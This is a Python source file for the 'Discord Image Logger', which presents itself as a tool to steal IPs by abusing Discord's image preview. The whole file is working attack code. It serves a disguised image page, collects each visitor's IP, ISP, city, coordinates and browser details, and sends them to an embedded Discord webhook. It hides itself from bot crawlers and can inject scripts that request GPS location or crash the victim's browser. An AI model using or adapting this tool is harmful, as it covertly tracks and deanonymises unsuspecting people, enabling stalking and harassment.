# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/995297084381089822/lrDPw0WkJA5qLwoX96BNgLmJlXxj2OkLAfQbLdymzt9ROFegpYh3oKv2oUZl9HsPV-x-",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image EXE LOL", # Set this to the name you want the webhook to have
    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 0, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
